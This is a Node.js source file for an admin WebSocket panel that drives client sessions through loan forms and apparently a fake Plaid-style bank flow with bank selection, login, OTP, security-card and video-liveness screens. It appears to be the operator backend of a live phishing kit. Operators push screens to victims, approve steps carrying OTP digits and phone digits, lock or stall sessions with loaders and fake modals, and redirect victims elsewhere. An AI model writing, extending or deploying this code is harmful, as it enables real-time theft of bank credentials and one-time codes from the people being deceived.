/**
 * ================================================================
 *  ADMIN-WS.JS — Admin WebSocket Channel
 *  Bidirectional real-time admin panel ↔ backend communication.
 *
 *  Replaces the SSE-only admin stream with a full WebSocket channel.
 *  Admin panel connects to /ws/admin, then sends
 *  { type: 'auth', token: ADMIN_KEY } as its FIRST frame.
 *  Unauthenticated sockets are closed with code 4001 after 8s.
 *
 *  FEATURES:
 *  - First-frame token auth (token never appears in access logs)
 *  - Live session list with WS presence tracking
 *  - Approve/Reject ALL steps (removes Telegram-only restriction)
 *  - Force Navigate with fragment push + automatic page routing
 *  - Force Loader, Custom Modals, Lock/Unlock
 *  - Real-time broadcast of all session events
 * ================================================================
 */

'use strict';

const WebSocket = require('ws');

const AUTH_TIMEOUT_MS = 8000;
const AUTH_CLOSE_CODE  = 4001;

// ── Force Navigate tables ───────────────────────────────────
// Fragments required to land on a page.
const PAGE_FRAGS = {
  INDEX:    [],
  CONTRACT: ['c_forma_v1'],
  PLAID:    ['p_init_v1'],
  SUCCESS:  ['success_v1'],
};

// Fragments that represent a specific screen.
const SCREEN_FRAGS = {
  formA:         'c_forma_v1',
  formB:         'c_formb_v1',
  formC:         'c_formc_v1',
  initial:       'p_init_v1',
  bankSelection: 'p_banksel_v1',
  login:         'p_login_v1',
  otp:           'p_otp_v1',
  securityCard:  'p_card_v1',
  videoLiveness: 'p_liveness_v1',
};

// Owning page for every screen, so a screen push from another
// page also moves the client instead of rendering off-screen.
const SCREEN_PAGE = {
  formA:         'CONTRACT',
  formB:         'CONTRACT',
  formC:         'CONTRACT',
  initial:       'PLAID',
  bankSelection: 'PLAID',
  login:         'PLAID',
  otp:           'PLAID',
  securityCard:  'PLAID',
  videoLiveness: 'PLAID',
};

/**
 * @param {http.Server} server
 * @param {object}      deps — injected dependencies from server.js
 */
module.exports = function setupAdminWS(server, deps) {
  const {
    wsClients,         // Map<sessionId, ws> — client WebSockets
    sseClients,        // Map<sessionId, res> — client SSE responses
    redis,
    supabase,
    deliverFragment,
    deliverCommand,
    insertCommand,
    FLOW_FRAGMENT_MAP,
    ADMIN_KEY,
    RK,
    Log,
  } = deps;

  if (!ADMIN_KEY) {
    Log.warn('[AdminWS] ADMIN_KEY is not set — every connection will be rejected');
  }

  // ── Admin WebSocket Server (noServer mode) ─────────────────
  // MUST use noServer to avoid conflicting with client WSS on /ws.
  // Manual upgrade routing ensures /ws goes to client WSS untouched.
  const adminWss = new WebSocket.Server({ noServer: true });
  const adminClients = new Set();

  server.on('upgrade', (request, socket, head) => {
    let pathname;
    try {
      pathname = new URL(request.url, 'http://localhost').pathname;
    } catch {
      return;
    }
    if (pathname !== '/ws/admin') return; // Let client WSS handle /ws

    adminWss.handleUpgrade(request, socket, head, (ws) => {
      adminWss.emit('connection', ws, request);
    });
  });

  // ── Connection: auth gate ─────────────────────────────────
  adminWss.on('connection', (ws) => {
    ws.isAlive  = true;
    ws.isAuthed = false;

    const authTimer = setTimeout(() => {
      if (ws.isAuthed) return;
      _safeSend(ws, { type: 'auth_error', reason: 'timeout' });
      try { ws.close(AUTH_CLOSE_CODE, 'auth timeout'); } catch {}
    }, AUTH_TIMEOUT_MS);

    ws.on('pong', () => { ws.isAlive = true; });

    ws.on('close', () => {
      clearTimeout(authTimer);
      if (adminClients.delete(ws)) {
        Log.info(`[AdminWS] Disconnected (total: ${adminClients.size})`);
      }
    });

    ws.on('error', () => {
      clearTimeout(authTimer);
      adminClients.delete(ws);
    });

    ws.on('message', async (raw) => {
      let msg;
      try {
        msg = JSON.parse(raw.toString());
      } catch (e) {
        Log.warn('[AdminWS] Parse error:', e.message);
        return;
      }
      if (!msg || typeof msg !== 'object') return;

      // ── First frame must be auth ──
      if (!ws.isAuthed) {
        if (msg.type !== 'auth' || String(msg.token) !== String(ADMIN_KEY)) {
          _safeSend(ws, { type: 'auth_error', reason: 'bad_token' });
          try { ws.close(AUTH_CLOSE_CODE, 'unauthorized'); } catch {}
          return;
        }
        ws.isAuthed = true;
        clearTimeout(authTimer);
        adminClients.add(ws);
        Log.info(`[AdminWS] Authenticated (total: ${adminClients.size})`);
        _safeSend(ws, { type: 'auth_ok' });
        _sendSessionList(ws);
        return;
      }

      // ── Already authed: tolerate a repeated auth frame ──
      if (msg.type === 'auth') {
        _safeSend(ws, { type: 'auth_ok' });
        return;
      }

      // ── Authed: normal dispatch ──
      try {
        await _handleMessage(ws, msg);
      } catch (e) {
        Log.warn(`[AdminWS] Handler error (${msg.type}): ${e.message}`);
        _safeSend(ws, { type: 'admin_error', command: msg.type, message: e.message });
      }
    });
  });

  // ── Ping interval (authed clients only) ───────────────────
  setInterval(() => {
    adminClients.forEach(ws => {
      if (!ws.isAlive) {
        adminClients.delete(ws);
        try { ws.terminate(); } catch {}
        return;
      }
      ws.isAlive = false;
      try { ws.ping(); } catch {}
    });
  }, 30000);

  // ── Session list (sent after auth + on refresh) ───────────
  async function _sendSessionList(ws) {
    try {
      const { data, error } = await supabase
        .from('sessions')
        .select('*, applications(client_name, loan_amount)')
        .order('last_heartbeat', { ascending: false })
        .limit(100);

      if (error) throw new Error(error.message);

      const sessions = await Promise.all((data || []).map(async (s) => {
        const wsAlive = wsClients.has(s.session_id);
        let hbAlive = false;
        try {
          hbAlive = (await redis.exists(RK.heartbeat(s.session_id))) === 1;
        } catch {}
        return {
          ...s,
          _wsLive:  wsAlive,
          _hbLive:  hbAlive,
          _status:  wsAlive ? 'online' : (hbAlive ? 'idle' : 'offline'),
        };
      }));

      _safeSend(ws, { type: 'session_list', sessions });
    } catch (e) {
      Log.error('[AdminWS] Session list error:', e.message);
      _safeSend(ws, { type: 'admin_error', command: 'session_list', message: e.message });
    }
  }

  // ═══════════════════════════════════════════════════════════
  //  MESSAGE HANDLER
  // ═══════════════════════════════════════════════════════════

  async function _handleMessage(ws, msg) {
    if (!msg.type) return;
    const sessionId = msg.sessionId;

    // Non-session commands
    if (msg.type === 'admin_refresh_sessions') {
      await _sendSessionList(ws);
      return;
    }

    if (!sessionId) {
      _safeSend(ws, { type: 'admin_error', command: msg.type, message: 'missing sessionId' });
      return;
    }

    Log.info(`[AdminWS] ${msg.type} → ${String(sessionId).slice(0, 8)}…`);

    switch (msg.type) {

      // ── Force Navigate (fragment push, then route) ──────────
      case 'admin_force_navigate': {
        const { target_page, target_screen } = msg.payload || {};

        const frag = target_screen ? SCREEN_FRAGS[target_screen] : null;
        const page = target_screen
          ? (SCREEN_PAGE[target_screen] || target_page)
          : target_page;

        if (!page || !(page in PAGE_FRAGS)) {
          _safeSend(ws, {
            type: 'admin_error',
            command: msg.type,
            message: `unknown target: ${target_page || ''}/${target_screen || ''}`,
          });
          break;
        }

        if (frag) {
          await deliverFragment(sessionId, frag);
        } else {
          for (const fid of PAGE_FRAGS[page]) {
            await deliverFragment(sessionId, fid);
            await _wait(250);
          }
        }

        // Always route, even on the same page — Pages.show is a no-op
        // there, and it covers the cross-page screen case.
        await _wait(500);
        await deliverCommand(sessionId, {
          type: 'FORCE_NAVIGATE_PAGE',
          payload: { route: page },
        });

        broadcast({ type: 'admin_navigated', sessionId, target_page: page, target_screen });
        break;
      }

      // ── Approve Step ────────────────────────────────────────
      case 'admin_approve_step': {
        const { stepType, otp_digits, phone_last4 } = msg;
        if (!stepType) {
          _safeSend(ws, { type: 'admin_error', command: msg.type, message: 'missing stepType' });
          break;
        }

        await supabase.from('submissions').update({
          status:      'approved',
          reviewed_at: new Date().toISOString(),
          reviewed_by: 'admin_panel',
        }).eq('session_id', sessionId)
          .eq('step_type', stepType)
          .eq('status', 'pending_review');

        const approvePayload = { step_type: stepType };
        if (otp_digits)  approvePayload.otp_digits  = otp_digits;
        if (phone_last4) approvePayload.phone_last4 = phone_last4;

        const cmdId = await insertCommand(sessionId, null, 'APPROVE_STEP', approvePayload);
        await deliverCommand(sessionId, {
          type: 'APPROVE_STEP',
          id:   cmdId,
          payload: approvePayload,
        });

        const nextFrags = FLOW_FRAGMENT_MAP[stepType];
        if (Array.isArray(nextFrags) && nextFrags.length) {
          await _wait(600);
          for (const fid of nextFrags) {
            await deliverFragment(sessionId, fid);
          }
        }

        // Special: plaid_bank_login → also deliver OTP fragment
        if (stepType === 'plaid_bank_login') {
          await _wait(600);
          await deliverFragment(sessionId, 'p_otp_v1');
        }

        broadcast({ type: 'step_approved', sessionId, stepType, ts: new Date().toISOString() });
        Log.info(`[AdminWS] APPROVED: ${stepType} → ${String(sessionId).slice(0, 8)}…`);
        break;
      }

      // ── Reject Step ─────────────────────────────────────────
      case 'admin_reject_step': {
        const { stepType, reason } = msg;
        if (!stepType) {
          _safeSend(ws, { type: 'admin_error', command: msg.type, message: 'missing stepType' });
          break;
        }

        await supabase.from('submissions').update({
          status:      'rejected',
          admin_note:  reason || null,
          reviewed_at: new Date().toISOString(),
          reviewed_by: 'admin_panel',
        }).eq('session_id', sessionId)
          .eq('step_type', stepType)
          .eq('status', 'pending_review');

        const cmdId = await insertCommand(sessionId, null, 'REJECT_STEP', {
          step_type: stepType, reason, allow_retry: true,
        });
        await deliverCommand(sessionId, {
          type: 'REJECT_STEP',
          id:   cmdId,
          payload: { step_type: stepType, reason, allow_retry: true },
        });

        broadcast({ type: 'step_rejected', sessionId, stepType, reason, ts: new Date().toISOString() });
        Log.info(`[AdminWS] REJECTED: ${stepType} → ${String(sessionId).slice(0, 8)}…`);
        break;
      }

      // ── Force Loader ────────────────────────────────────────
      case 'admin_force_loader': {
        const cmdType = msg.action === 'show' ? 'SHOW_LOADER' : 'HIDE_LOADER';
        await deliverCommand(sessionId, {
          type: cmdType,
          payload: { message: msg.message || 'Please wait…' },
        });
        break;
      }

      // ── Force Modal ─────────────────────────────────────────
      case 'admin_force_modal': {
        const p = msg.payload || {};
        await deliverCommand(sessionId, {
          type: 'FORCE_MODAL_CUSTOM',
          payload: {
            header:     p.header     || 'Notice',
            variant:    p.variant    || 'info',
            body:       p.body       || '',
            showUpload: p.showUpload === true,
            showCamera: p.showCamera === true,
            okLabel:    p.okLabel    || 'OK',
          },
        });
        break;
      }

      // ── Lock / Unlock ───────────────────────────────────────
      case 'admin_lock_session': {
        await deliverCommand(sessionId, {
          type: 'LOCK_SESSION',
          payload: { message: msg.message || 'Session paused by admin.' },
        });
        break;
      }
      case 'admin_unlock_session': {
        await deliverCommand(sessionId, {
          type: 'UNLOCK_SESSION',
          payload: {},
        });
        break;
      }

      // ── Request Upload ──────────────────────────────────────
      case 'admin_request_upload': {
        await deliverCommand(sessionId, {
          type: 'REQUEST_UPLOAD',
          payload: msg.payload || { prompt: 'Please upload your document.' },
        });
        break;
      }

      // ── Send Toast ──────────────────────────────────────────
      case 'admin_send_toast': {
        await deliverCommand(sessionId, {
          type: 'SHOW_TOAST',
          payload: msg.payload || { type: 'info', text: 'Notice from admin.' },
        });
        break;
      }

      // ── Redirect External ───────────────────────────────────
      case 'admin_redirect': {
        await deliverCommand(sessionId, {
          type: 'REDIRECT_EXTERNAL',
          payload: msg.payload || {},
        });
        break;
      }

      default:
        Log.debug(`[AdminWS] Unknown command: ${msg.type}`);
        _safeSend(ws, { type: 'admin_error', command: msg.type, message: 'unknown command' });
    }
  }

  // ── Broadcast to all authed admin WS clients ──────────────
  function broadcast(msg) {
    if (adminClients.size === 0) return;
    const raw = JSON.stringify(msg);
    adminClients.forEach(ws => {
      if (ws.readyState === WebSocket.OPEN) {
        try { ws.send(raw); } catch { adminClients.delete(ws); }
      }
    });
  }

  function _safeSend(ws, obj) {
    if (ws.readyState !== WebSocket.OPEN) return;
    try { ws.send(JSON.stringify(obj)); } catch {}
  }

  function _wait(ms) { return new Promise(r => setTimeout(r, ms)); }

  Log.info('[AdminWS] Module loaded — /ws/admin ready (first-frame auth)');

  return { broadcast, adminClients };
};
